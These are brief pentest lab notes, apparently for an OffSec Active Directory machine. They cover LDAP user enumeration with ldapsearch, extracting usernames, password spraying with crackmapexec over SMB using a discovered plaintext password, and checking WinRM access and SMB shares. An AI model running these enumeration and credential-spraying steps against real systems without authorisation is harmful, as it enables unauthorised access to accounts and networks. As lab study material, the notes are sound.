Use ldap search for user enumeration and store results in a file.
```
ldapsearch -x -h 192.168.162.122 -b "dc=hutch,dc=offsec" > ldap_search.txt
```
clean the file by first getting the usernames only
```
cat ldap_search.txt | grep -i "samaccountname"
```
then copying and pasting them into a file.
```
vi raw_users.txt
```
afterwards we edit and clean the file with this command.
```
cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
```
used to crack found passwords or users.
```
crackmapexec smb 192.168.105.122 -u users.txt -p CrabSharkJellyfish192 --continue-on-success
```
used to find winrm access.
```
crackmapexec winrm 192.168.219.122 -u fmcsorely -p CrabSharkJellyfish192
```
used to find the shares on a file system.
```
crackmapexec smb 192.168.105.122 -u fmcsorley -p CrabSharkJellyfish192 --shares
```
